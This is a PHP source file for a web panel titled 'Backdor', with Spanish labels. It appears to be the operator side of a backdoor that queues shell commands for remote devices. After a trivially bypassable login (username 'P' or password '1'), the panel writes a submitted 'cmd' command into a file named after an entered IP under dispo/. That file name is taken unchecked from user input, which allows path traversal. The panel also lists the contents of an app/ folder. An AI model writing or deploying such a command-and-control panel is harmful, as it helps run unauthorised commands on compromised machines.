<?php session_start(); ?>


<?php 
if (isset($_SESSION['name'])){
 ?>

    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <title>Backdor</title>
        <style>
            body{
                background-color: grey;
                background-size: cover;
                background-repeat: no-repeat;
                background-attachment: fixed;
                background-position: center;
                background-color: #cccccc;
            }
            .login-box{
                width: 320px;
                height: 420px;
                background: #fff;
                color: #000;
                top: 50%;
                left: 50%;
                position: absolute;
                transform: translate(-50%,-50%);
                box-sizing: border-box;
                padding: 70px 30px;
            }
            .avatar{
                width: 100px;
                height: 100px;
                border-radius: 50%;
                position: absolute;
                top: -50px;
                left: calc(50% - 50px);
            }   
            h1{
                margin: 0;
                padding: 0 0 20px;
                text-align: center;
                font-size: 22px;
            }
            .login-box p{
                margin: 0;
                padding: 0;
                font-weight: bold;
            }
            .login-box input{
                width: 100%;
                margin-bottom: 20px;
            }
            .login-box input[type="text"], input[type="password"]{
                border: none;
                border-bottom: 1px solid #000;
                background: transparent;
                outline: none;
                height: 40px;
                color: #000;
                font-size: 16px;
            }
            .login-box input[type="submit"]{
                border: none;
                outline: none;
                height: 40px;
                background: #000;
                color: #fff;
                font-size: 18px;
                border-radius: 20px;
            }
            .login-box input[type="submit"]:hover{
                cursor: pointer;
                background: #fff;
                color: #000;
            }
            .login-box a{
                text-decoration: none;
                font-size: 12px;
                line-height: 20px;
                color: darkgrey;
            }
            .login-box a:hover{
                color: #000;
            }

        </style>
    </head>
    <body>
        <form class="login-box"  method="post">
            <label for="username">ip.txt</label>
            <input type="text" name="ip" id="username">
            <label for="password">comando cmd</label>
            <input type="text" name="cmd" id="password">
            <input type="submit" value="Enviar valor">
        </form>
        <?php
            if(isset($_POST['ip']) && isset($_POST['cmd'])){
                $username = $_POST['ip'];
                $password = $_POST['cmd'];

                $text = "dispo/" . $username;
                $text = fopen($text, "w");    // Abrir archivo para escribir
                fwrite($text, $password);  // Escribir datos
                fclose($text);
            }
            $thefolder = "app/";
            if ($handler = opendir($thefolder)) {
                echo "<ul>";
                while (false !== ($file = readdir($handler))) {
                        echo "<li>$file</li>";
                }
                echo "</ul>";
                closedir($handler);
            }
        ?>
    </html>

<?php 
}else{
?>


    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <title>Login</title>
        <style>
            body{
                background-image: url("https://images.unsplash.com/photo-1518806118471-f28b20a1d79d?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1350&q=80");
                background-size: cover;
                background-repeat: no-repeat;
                background-attachment: fixed;
                background-position: center;
                background-color: #cccccc;
            }
            .login-box{
                width: 320px;
                height: 420px;
                background: #fff;
                color: #000;
                top: 50%;
                left: 50%;
                position: absolute;
                transform: translate(-50%,-50%);
                box-sizing: border-box;
                padding: 70px 30px;
            }
            .avatar{
                width: 100px;
                height: 100px;
                border-radius: 50%;
                position: absolute;
                top: -50px;
                left: calc(50% - 50px);
            }   
            h1{
                margin: 0;
                padding: 0 0 20px;
                text-align: center;
                font-size: 22px;
            }
            .login-box p{
                margin: 0;
                padding: 0;
                font-weight: bold;
            }
            .login-box input{
                width: 100%;
                margin-bottom: 20px;
            }
            .login-box input[type="text"], input[type="password"]{
                border: none;
                border-bottom: 1px solid #000;
                background: transparent;
                outline: none;
                height: 40px;
                color: #000;
                font-size: 16px;
            }
            .login-box input[type="submit"]{
                border: none;
                outline: none;
                height: 40px;
                background: #000;
                color: #fff;
                font-size: 18px;
                border-radius: 20px;
            }
            .login-box input[type="submit"]:hover{
                cursor: pointer;
                background: #fff;
                color: #000;
            }
            .login-box a{
                text-decoration: none;
                font-size: 12px;
                line-height: 20px;
                color: darkgrey;
            }
            .login-box a:hover{
                color: #000;
            }

        </style>-->
    </head>
    <body>
        <form class="login-box"  method="post">
            <label for="username">Username</label>
            <input type="text" name="username" id="username">
            <label for="password">Password</label>
            <input type="password" name="password" id="password">
            <input type="submit" value="Login">
        </form>
        <?php
            if(isset($_POST['username']) && isset($_POST['password'])){
                $username = $_POST['username'];
                $password = $_POST['password'];
                if ($username == "P" || $password == "1"){
                    
                    $_SESSION['name'] = "created";
                    
                }else{
                    echo "contraseña incorrecta";
                }
            }else{
                echo "hay espacios en blanco";
            }
        ?>
    </html>

<?php 

}
